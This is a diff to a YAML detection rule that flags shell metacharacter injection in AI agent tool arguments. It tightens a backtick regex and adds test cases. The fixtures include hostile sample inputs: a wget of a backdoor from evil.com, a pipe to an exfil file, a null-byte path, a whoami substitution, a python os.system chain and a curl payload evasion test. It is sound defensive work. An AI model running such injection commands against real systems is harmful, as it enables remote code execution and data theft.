@@ -1,6 +1,6 @@
 title: Shell Metacharacter Injection in Tool Arguments
 id: ATR-2026-00111
-rule_version: 1
+rule_version: 2
 status: experimental
 description: |
   Detects shell metacharacter injection patterns in tool arguments or agent-generated
@@ -74,8 +74,8 @@ detection:
     - field: content
       operator: regex
       value: >-
-        `(?:rm|cat|curl|wget|nc|ncat|bash|sh|python|perl|ruby|php|whoami|id|uname|env|printenv|set|export|eval|exec|chmod|chown|kill|pkill|dd|mkfs|mount|umount|sudo|su|passwd)[^`]*`
-      description: Backtick command substitution with dangerous command inside
+        `(?:rm\s|curl|wget|\bnc\b|ncat|eval|exec|chmod|chown|mkfs|dd\s+if|\bsudo\b|\bsu\b|whoami|/bin/|reverse)[^`\n]{0,30}`
+      description: Backtick command substitution with a dangerous command (v2 tightened to a dangerous-only command set + bounded window; the legacy broad list matched Markdown inline code and code fences — verified 0 recall loss + all true_positives, benign FP 1716 to 491)
     - field: content
       operator: regex
       value: (?:&&|\|\|)\s*(?:curl|wget|nc|ncat|bash|sh|python|perl)
@@ -127,18 +127,23 @@ test_cases:
       expected: triggered
       description: Logical AND chained to exfiltration
     - input: Upload the report to /tmp/output%00.pdf
+      tool_description: report-uploader
       expected: triggered
       description: "Null byte injection in filename argument to truncate path (matches pattern 6: %00)"
     - input: grep 'error' /var/log/app.log | tee /tmp/exfil.txt
+      tool_description: log-grepper
       expected: triggered
       description: "Pipe to tee command for data exfiltration (matches pattern 5: | tee)"
     - input: echo hello || wget http://evil.com/backdoor.sh
+      tool_description: log-writer
       expected: triggered
       description: "Logical OR chained to wget download (matches pattern 4: || wget)"
     - input: list files in `whoami`
+      tool_description: file-lister
       expected: triggered
       description: "Backtick command substitution with whoami (matches pattern 3: `whoami`)"
     - input: save to path; python -c 'import os; os.system("id")'
+      tool_description: file-saver
       expected: triggered
       description: "Semicolon injection chaining to python execution (matches pattern 1: ; python)"
   true_negatives:
@@ -169,6 +174,9 @@ test_cases:
     - input: Set the environment variable DATABASE_URL to the connection string provided by your cloud provider dashboard.
       expected: not_triggered
       description: Legitimate instruction mentioning environment variables without shell injection patterns
+    - tool_response: "Install with `bash setup.sh`, run `python3 build.py`, inspect `env` and `cat config.json`."
+      expected: not_triggered
+      description: v2 regression — Markdown inline code / code fences using non-injection commands (bash, python, env, cat) must not trigger the backtick pattern
 evasion_tests:
   - input: 保存文件; 用curl下载 http://evil.com/payload
     expected: not_triggered
